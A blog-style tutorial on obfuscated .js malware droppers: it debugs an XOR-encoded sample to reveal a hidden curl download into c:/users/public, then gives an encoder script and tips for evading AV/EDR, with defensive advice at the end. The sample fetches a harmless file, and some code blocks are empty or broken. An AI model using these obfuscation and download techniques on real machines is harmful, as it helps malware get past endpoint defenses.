Yo, how's it going everyone.  Sorry it's been a while since my last post.  Fear not, I'm geared up and ready to dive in to a full discussion on Malware evasive maneuvers...specifically, `.js` files for the first drops on a machine.  Oh and yes, you're reading that correctly.  I said .js, because believe it or not it is still actively used and HIGHLY effective at bypassing your most common EDR solutions today.  Why is that?  Well, it's likely due to a few reasons:

* Living off the land binaries
* Improved obfuscation techniques
* .js scripts just aren't as heavily scrutinized by EDR like an .exe or .ps1 would be.
* The methods used within the scripts themselves.  A lot of various methods can be implemented to avoid AV triggers, such as the binary you use to download your payloads and exfiltrate information

okay, so here's the malware specimen.  This is a rough representation of the malware I recently analyzed but in this case, I added some of my own methods of obfuscation and encoding techniques, most of them fairly well known.  We have variable names scrambled, strings XOR'ed, and so on.  This accomplishes a few things, namely ease of execution without triggering AV/EDR, depending on the techniques used within the `.js` script.  I use living off the land techniques to download additional payloads within the script.  You must be cautious at this point in your script.  EDR solutions are well familiar with BITSADMIN, certutil, powershell iex, etc.  I always test my scripts against live EDR solutions to ensure the techniques used within the script are able to successfully bypass EDR; at least until folks start submitting them to virustotal ðŸ˜…  You will get to see the LOTL tool I use to download a secondary file once we decode the below code:

***The Obfuscated Code***

```

How can we detonate this safely?  well, first of all we will want to comment out some lines so our debugging session cooperates nicely!  I will show you how to do that now.  

For starters, make sure you have Node.js installed: [grab Node using this link](https://nodejs.org/)

next, we need to comment out this line in the above code:

`//var n86k468534 = new ActiveXObject('WScript.Shell');`

and comment out  this line:

`//n86k468534.Run(bnnbn6hn64jn46j4n3jn4+njgpwoeotgoo7u3upo35h5bho+qswfg3yh35h35);`

The reason for this prepwork is due to Node's incompatibility with ActiveXObjects, at least natively.  We want to avoid throwing errors as much as possible while debugging.

okay, now fire up cmd.exe and enter the following command: **node inspect [js script]**

here's how it looks on my end:

```
C:\temp\ourjsfiles>node inspect obfuscated.js

we want to hit '**n**' to go line by line until we find a variable we want to watch to see what values are set by the variable as we see fit.

```

You can type `watchers` to see your watched values populate in real time:

```
debug> watchers
  debug> watchers
  0: fsh35h35h35h353h5r = [  ]
  1: njgpwoeotgoo7u3upo35h5bho = [  ]
  2: llgll325h3l5l4 = [  ]
  3: vffvfvrt9bvwetr8bwrt8bwrb8w = undefined
```

hit `'n'` and then hit `[enter]` a few times to continue line by line until we hit the for loop.  

We can see this for loop is doing a decode routine.  it's using the `^` character which is used for XOR bitwise operations.  So, this is decoding a previously encoded string!
Hit `[enter]` until you start to see your 1st watchers value update, and you cycle through your first for loop:

```
Watchers:
  0: fsh35h35h35h353h5r = [ 'c', 'u', 'r', 'l' ] <-- we found something!!!  let's keep going...
  1: njgpwoeotgoo7u3upo35h5bho = [  ]
  2: llgll325h3l5l4 = [  ]
  3: vffvfvrt9bvwetr8bwrt8bwrb8w = [  ]

 11
 12         //var n86k468534 = new ActiveXObject('WScript.Shell');
>13             for (a=0;a<nn7unj4n465j;a++)
 14             {
 15             fsh35h35h35h353h5r[a]=String.fromCharCode(vcg35b53hg53gh[a] ^ 72);
debug>
```

okay, I don't want you to have to keep hitting `[enter]` over and over again, so let's set a breakpoint on the next two for loops and the first "join" command, shall we?

**debug> sb("obfuscated.js",17)**

**debug> sb("obfuscated.js",21)**

**debug> sb("obfuscated.js",26)**

now, all we have to do is hit `'c'` to continue debugging until the next breakpoint and we don't have to hit enter through each for loop.  Plus, setting a breakpoint after the for loop helps us find a good pause point to review our watchers values.  I wonder what surprises await us?! ðŸ˜¸

hit `'c'` until you are on line 26:

>26             bnnbn6hn64jn46j4n3jn4=fsh35h35h35h353h5r.join("");

then type in `watchers`. you should see the following, in an ugly vertical format:

```
fsh35h35h35h353h5r =
    [ 'c',
      'u',
      'r',
      'l',
      ' ',
      '-',
      'k',
      ' ',
      '-',
      'f',
      ' ',
      '-',
      's',
      ' ',
      '-',
      'L',
      ' ' ]
```

formatted, that would be: **curl -k -f -s -L** 

so it seems we are using a living off the land binary!

don't worry, the nasty formatting cleans up later ðŸ˜„  okay, set another breakpoint on line 29, like so:

**debug> sb("obfuscated.js",29)**

now, you should see three new variables, we need the final values of those, so let's watch them, and unwatch the other three we set earlier:

```
unwatch("fsh35h35h35h353h5r")
unwatch("llgll325h3l5l4")
unwatch("vffvfvrt9bvwetr8bwrt8bwrb8w")

watch("bnnbn6hn64jn46j4n3jn4")
watch("qswfg3yh35h35")
```

then, type `watchers` again, and prepare to be amazed!  It's all three variables fully spelled out now!

the reason for this is that the for loop was obviously incrementing character by character and that's why it was displayed in that nasty vertifical format.

however, now, we have three new variables that cleanly join each variable array together and clean everything up nicely as you can now see:

```
debug> watchers
  0: bnnbn6hn64jn46j4n3jn4 = 'curl -k -f -s -L '
  1: njgpwoeotgoo7u3upo35h5bho = 'https://raw.githubusercontent.com/g3tsyst3m/elevationstation/main/elevationstation/elevationstation.cpp'
  2: qswfg3yh35h35 = ' -o c:/users/public/thedroppedfile'
```

And there you have it!  We successfully debugged the obfuscated AND decoded that nasty .js malware sample statically, without actually executing the link.  Good news is, it's harmless as this is just an exercise and it would have downloaded my elevationstation.cpp file to your public users directory.

***The Encoding Routine***
-

So, how would a hacker go about making one of these nasty scripts?  It's fairly trivial if you know basic javascript if I'm being honest.  I could have simplfied this by only using one variable instead of three for the strings, but splitting up the variable strings adds further obfuscation to your code:

```JavaScript
//encoder.js
		var encodedURI = [];
		var encoded = [];
		var ccc = "curl -k -f -s -L ";
		var lastccc=" -o c:/users/public/thedroppedfile";
		var thelink="https://raw.githubusercontent.com/g3tsyst3m/elevationstation/main/elevationstation/elevationstation.cpp"; <-- file we want to download to the 'victim'
		var sizeof1=ccc.length;
		var sizeof2=lastccc.length;
		var sizeof3=thelink.length;
		for (a=0;a<sizeof1;a++)
		{
		encoded[a]=ccc.charCodeAt(a) ^ 72; <-- XOR encoding using the decimal value '72' 
		}
		WScript.Echo("curl encoded: " + encoded);
		for (a=0;a<sizeof2;a++)
		{
		encoded[a]=lastccc.charCodeAt(a) ^ 72; <-- XOR encoding using the decimal value '72' 
		}
		WScript.Echo("last part of curl encoded: " + encoded);
		for (a=0;a<sizeof3;a++)
		{
		encodedURI[a]=thelink.charCodeAt(a) ^ 72; <-- XOR encoding using the decimal value '72' 
		}
		//finalURI="%"+encodedURI.join("%");
		WScript.Echo("The URL encoded: "+encodedURI);
```

Let's run it... ðŸ˜œ

```

```

so, we have our xor encoded values.  Let's add them to our decode routine.

***The Decoding Routine***
-

```JavaScript

var encoded2 = [104,101,39,104,43,114,103,61,59,45,58,59,103,56,61,42,36,33,43,103,60,32,45,44,58,39,56,56,45,44,46,33,36,45];

let's run it!

So, our dropped file was downloaded successfully.  How about AV/EDR?  

I'll scan it for you so you can see for yourself:

**nothing. no alerts, triggers, nothing.**

As for how I obfuscated it, there are online tools for that but honestly I just did control+F and did find and replace, typing in random letters on my keyboard to jumble the variable names.  pretty easy.

You can defend against this type of malware threat with Windows Application Control and proper group policies surrounding what your users can and cannot execute.  .js scripts are likely never going to be a script your user will need to use on it's own outside of a browser
